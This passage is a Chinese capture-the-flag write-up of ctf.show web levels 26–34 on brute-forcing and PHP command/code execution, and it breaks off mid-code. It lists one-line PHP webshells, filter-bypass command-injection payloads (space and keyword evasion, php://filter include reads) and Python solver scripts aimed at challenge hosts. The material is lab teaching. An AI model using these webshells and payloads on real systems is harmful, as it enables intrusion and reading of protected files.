title="web26"></a>web26</h3><p>看着是在安装数据库</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web26-1.png"></p><p>在我们点击确认安装后，没什么反应，查看源码，有文件checkdb.php检验，这样构造请求可以登录，其实就是用post的方式带着上面的登录信息，只不过我们如果访问文件checkdb.php，参数可以为空<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web26-2.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web26-0.png"></p><p>​      </p><h3 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h3><p>看到的是一个正方cms<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web27-1.png"></p><p>点击查看录取名单和学生学籍信息查询系统<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web27-0.png"></p><p>有个人信息，但是身份证号缺少了出生年月日，尝试爆破。注意日期格式要yyyyMMdd，月份要大小才能从01开始<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web27-2.png"></p><p>爆破完成<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web27-3.png"></p><p>将这段Unicode编码解码一下<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web27-4.png"></p><p>我们尝试去登录<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web27-5.png"></p><p>​      </p><h3 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h3><p>页面什么也没有，但是url应该是入手点，很诡异，尝试目录爆破<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web28-0.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web28-1.png"></p><p>两级目录都使用0-100<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web28-3.png"></p><p>爆破出了flag<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web28-2.png"></p><h2 id="命令执行-29-124"><a href="#命令执行-29-124" class="headerlink" title="命令执行(29-124)"></a>命令执行(29-124)</h2><p>区分命令执行和代码执行 <a href="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html">代码执行漏洞和命令执行漏洞.html</a> </p><p>最经典的eval和system对比：</p><p><strong>eval类型函数是代码执行而不是命令执行</strong>（一句话木马），eval函数里必须是一个符合php语法的语句，如果语句结尾没有分号会报错：<strong>eval()’d code</strong></p><p><strong>system类型函数是命令执行而不是代码执行</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo 1+1;&quot;</span>);    <span class="comment">//2</span></span><br><span class="line">    system(<span class="string">&quot;echo 1+1;&quot;</span>);  <span class="comment">//1+1;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$num</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;\$a = <span class="subst">$num</span>;&quot;</span>);    <span class="comment">//有效,$a=1</span></span><br><span class="line">    system(<span class="string">&quot;\$b = <span class="subst">$num</span>;&quot;</span>);  <span class="comment">//无效,$b=NULL  </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;phpinfo();&quot;</span>);   <span class="comment">//phpinfo()被执行</span></span><br><span class="line">    system(<span class="string">&quot;phpinfo()&quot;</span>);  <span class="comment">//phpinfo()不被执行</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    system(<span class="string">&quot;whoami&quot;</span>);    <span class="comment">//whoami命令被执行</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;whoami&quot;</span>);      <span class="comment">//whoami命令不被执行</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">代码执行：</span><br><span class="line"><span class="number">1</span>-<span class="keyword">eval</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]) <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>-assert</span><br><span class="line"><span class="meta">&lt;?php</span> assert(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]) <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>-call_user_func</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    call_user_func(<span class="variable">$_POST</span>[<span class="string">&quot;fun&quot;</span>],<span class="variable">$_POST</span>[<span class="string">&quot;para&quot;</span>])</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//post:fun=assert&amp;para=phpinfo();</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>-create_function</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$a</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span> = create_function(<span class="string">&#x27;$a&#x27;</span>,<span class="string">&quot;echo <span class="subst">$a</span>&quot;</span>);</span><br><span class="line">    <span class="variable">$b</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//post:func=phpinfo();</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>-array_map</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$array</span> = <span class="keyword">array</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">    array_map(<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>],<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//post:func=phpinfo</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">命令执行：</span><br><span class="line"><span class="number">1</span>-system</span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>-passthru</span><br><span class="line"><span class="meta">&lt;?php</span> passthru(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>-exec</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> exec(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>-pcntl_exec</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    pcntl_exec(<span class="string">&quot;/bin/bash&quot;</span>,<span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>-shell_exec</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> shell_exec(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">6</span>-popen()/proc_popen()</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$handle</span> = popen(<span class="string">&quot;/bin/ls&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">7</span>-``</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `whoami`<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">8</span>-</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">ob_start(<span class="variable">$cmd</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$_GET</span>[a]&quot;</span>;</span><br><span class="line">ob_end_flush();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//?a=whoami</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>命令执行漏洞主要是由system、exec、shell_exec，eval（报漏洞的时候不会将代码执行和命令执行分的那么清楚）等函数能把用户输入的内容当作是命令来执,反引号一般的作用是与system类似，都是把内容作为命令来执行。不过在这些命令执行函数里面，只有system是有回显的，其他的函数都需要搭配着echo来使用</p><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">以参数c传输值，如果不能匹配到flag(不区分大小写)就使用<span class="keyword">eval</span>函数执行传输的值</span><br></pre></td></tr></table></figure><p>​       </p><p>先ls查看一下有什么文件</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web29-0.png"></p><p>直接读取是不行的，尝试绕过，绕过flag.php的方法很多，这里使用*正则匹配的绕过方式绕过，更多的绕过方式后面也会提到</p><p>tac是查看代码的命令，与cat类似，是cat的反向显示，从最后一行开始显示，不知道为什么cat在这里用不了（其实是在源码里）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?c=system(<span class="string">&quot;tac fla*.php&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web29-1.png"></p><p>​       </p><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">过滤了关键字</span><br></pre></td></tr></table></figure><p>可以使用echo或print直接输出，或者类似system的passthru等函数代替。</p><p>查看文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="built_in">echo</span> `ls`;//加反引号，只要在反引号里的字符串都会被当作代码执行，注意如果反引号在单、双引号内则不起作用</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web30-1.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">?c=<span class="built_in">echo</span> `tac fla*.ph*`; //加反引号</span><br><span class="line">?c=passthru(<span class="string">&quot;tac fla*.ph*&quot;</span>); //替代system</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web30-0.png"></p><p>​      </p><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">过滤了点，空格，还有单引号</span><br></pre></td></tr></table></figure><p>空格使用URL编码的%20绕过失败，使用%09可以？？？%09是tab的url编码，需要有php环境下使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：?c=<span class="built_in">echo</span>%09`tac%09ls`;</span><br><span class="line">?c=<span class="built_in">echo</span>%09`tac%09fla*`;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web31-0.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web31-1.png"></p><p>写个python脚本也差不多</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="comment"># Author: MTRleed</span></span><br><span class="line"><span class="comment"># file: start.py</span></span><br><span class="line"><span class="comment"># time: 2023/4/6 12:04</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://c722604f-4d6d-49a1-b949-0abbccbd87b2.challenge.ctf.show/&quot;</span></span><br><span class="line">shell_url = url +<span class="string">&quot;?c=echo%09`tac%09fla*`;&quot;</span></span><br><span class="line">res = requests.get(url=shell_url)</span><br><span class="line">flag = re.search(<span class="string">&quot;(ctfshow&#123;.*?&#125;)&quot;</span>,res.text)</span><br><span class="line">flag = flag.group(<span class="number">1</span>)<span class="comment">#(1)表示上面的第一个正则表达式的那一层括号，但是只有一个，所以不写1也一样</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web31-2.png"></p><p>空格绕过方法还有：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">URL编码特殊字符 ：</span><br><span class="line">%20 ：普通空格</span><br><span class="line">%09 ：tab键（水平)</span><br><span class="line">%0a ：换行</span><br><span class="line">%0c ：新的一页</span><br><span class="line">%0d ：<span class="built_in">return</span>功能</span><br><span class="line">%0b ：tab键(垂直)</span><br><span class="line">%a0 ：空格</span><br><span class="line"></span><br><span class="line"><span class="variable">$IFS</span>符 ：</span><br><span class="line">$IFS$</span><br><span class="line">$IFS<span class="variable">$1</span></span><br><span class="line">$IFS<span class="variable">$9</span></span><br><span class="line"><span class="variable">$&#123;IFS&#125;</span><span class="variable">$9</span> ：$进行截断，9为当前shell进程的第九个参数，始终为空字符串</span><br><span class="line"><span class="variable">$&#123;IFS&#125;</span> ：在linux下，<span class="variable">$&#123;IFS&#125;</span>是分隔符的意思</span><br><span class="line"></span><br><span class="line">重定向 ：</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br></pre></td></tr></table></figure><p>​      </p><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">源码</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">过滤 . 空格 单引号 反引号 分号 括号</span><br></pre></td></tr></table></figure><p>使用include函数来读，因为带有php的语句是经过a参数传入的，所以检测不到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload：?c=include<span class="variable">$_POST</span>[a]?&gt;</span><br><span class="line">post：a=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">如果过滤不严格,也可以GET：?c=include(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);?&gt;&amp;url=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br><span class="line">在这里我们去掉被过滤的字符：?c=include<span class="variable">$_GET</span>[a]?&gt;&amp;a=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web32-0.png"></p><p>写个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="comment"># Author: MTRleed</span></span><br><span class="line"><span class="comment"># file: web32.py</span></span><br><span class="line"><span class="comment"># time: 2023/4/8 14:23</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="comment">#web操作库</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re <span class="comment">#正则表达式库</span></span><br><span class="line">url = <span class="string">&quot;http://2a971b99-6f8f-4b01-a12e-cc99f68e0279.challenge.ctf.show/&quot;</span></span><br><span class="line">shell_url = url+<span class="string">&quot;?c=include$_POST[a]?&gt;&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">       <span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url=shell_url,data=data)</span><br><span class="line">flag = base64.b64decode(res.text) <span class="comment">#base64解码,flag数据类型应该是字节流</span></span><br><span class="line"><span class="comment">#flag =re.search(&quot;(ctfshow&#123;.*?&#125;)&quot;,flag) #意外类型:(str, bytes),字符串和字节流不能混用，所以我们将flag字节流编码一下</span></span><br><span class="line">flag = re.search(<span class="string">&quot;(ctfshow&#123;.*?&#125;)&quot;</span>,<span class="built_in">bytes</span>.decode(flag)) <span class="comment">#bytes.decode()以指定的编码格式解码bytes对象。默认编码为&#x27;utf-8&#x27;</span></span><br><span class="line">flag = flag.group(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web32-1.png"></p><p>​       </p><h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">多过滤一个双引号</span><br></pre></td></tr></table></figure><p>继续使用上一关的payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include<span class="variable">$_GET</span>[a]?&gt;&amp;a=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="comment"># Author: MTRleed</span></span><br><span class="line"><span class="comment"># file: web33.py</span></span><br><span class="line"><span class="comment"># time: 2023/4/8 17:16</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://e5362d17-d863-4226-ba4f-03dcb95b7135.challenge.ctf.show/&quot;</span></span><br><span class="line">shell_url = url+<span class="string">&quot;?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php&quot;</span></span><br><span class="line">res = requests.get(url=shell_url)</span><br><span class="line">flag = re.search(<span class="string">&quot;(ctfshow&#123;.*&#125;)&quot;</span>,<span class="built_in">bytes</span>.decode(base64.b64decode(res.text))) <span class="comment">#.任意字符，*贪婪模式，?非贪婪模式</span></span><br><span class="line">flag = flag.group(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web33.png"></p><p>​       </p><h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">源码</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span 